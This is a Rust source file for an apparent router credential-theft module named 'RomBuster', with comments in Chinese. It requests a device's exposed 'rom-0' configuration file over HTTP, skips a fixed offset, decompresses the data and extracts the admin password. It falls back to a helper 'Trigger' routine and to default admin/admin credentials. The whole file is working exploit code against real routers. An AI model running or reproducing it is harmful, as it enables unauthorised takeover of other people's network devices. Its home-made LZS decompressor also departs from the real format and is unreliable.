use std::time::Duration;
use reqwest::blocking::Client;
use reqwest::Url;
use regex::Regex;
use crate::trigger::Trigger;

pub struct RomBuster;

impl RomBuster {
    pub fn new() -> Self {
        RomBuster
    }

    pub fn exploit(&self, address: &str) -> Option<(String, String)> {
        // 尝试通过 HTTP 获取 rom-0 文件
        if let Some(creds) = self.try_http_exploit(address) {
            return Some(creds);
        }

        // 如果 HTTP 方式失败，尝试使用 Trigger
        let host = address.split(':').next().unwrap_or(address);
        let trigger = Trigger::new(host);
        
        match trigger.extract_credentials() {
            Some((username, password)) => {
                if username.is_empty() && password.is_empty() {
                    Some(("admin".to_string(), "admin".to_string()))
                } else {
                    Some((username, password))
                }
            }
            None => None,
        }
    }

    fn try_http_exploit(&self, address: &str) -> Option<(String, String)> {
        let url = format!("http://{}/rom-0", address);
        let client = Client::builder()
            .timeout(Duration::from_secs(3))
            .danger_accept_invalid_certs(true)
            .build()
            .ok()?;

        let response = match client.get(&url).send() {
            Ok(res) => res,
            Err(_) => return None,
        };

        let bytes = match response.bytes() {
            Ok(b) => b,
            Err(_) => return None,
        };

        // 跳过前 8568 字节
        if bytes.len() < 8568 {
            return None;
        }
        let data = &bytes[8568..];

        // 解压缩数据
        let decompressed = match self.lzs_decompress(data) {
            Some(d) => d,
            None => return None,
        };

        // 提取密码
        let re = Regex::new(r"[\x20-\x7E]{5,}").unwrap();
        if let Some(cap) = re.find(&decompressed) {
            return Some(("admin".to_string(), cap.as_str().to_string()));
        }

        None
    }

    fn lzs_decompress(&self, input: &[u8]) -> Option<String> {
        // 简化的 LZS 解压缩实现
        let mut output = Vec::new();
        let mut i = 0;

        while i < input.len() {
            let control = input[i];
            i += 1;

            if control & 0x80 != 0 {
                // 复制序列
                let length = (control & 0x7F) as usize;
                if i + length > input.len() {
                    return None;
                }
                output.extend_from_slice(&input[i..i+length]);
                i += length;
            } else {
                // 重复序列
                if i + 2 > input.len() {
                    return None;
                }
                let offset = (control as usize) << 8 | input[i] as usize;
                i += 1;
                let length = input[i] as usize;
                i += 1;

                if offset > output.len() || length == 0 {
                    return None;
                }

                for _ in 0..length {
                    let pos = output.len() - offset;
                    if pos >= output.len() {
                        return None;
                    }
                    output.push(output[pos]);
                }
            }
        }

        String::from_utf8(output).ok()
    }
}
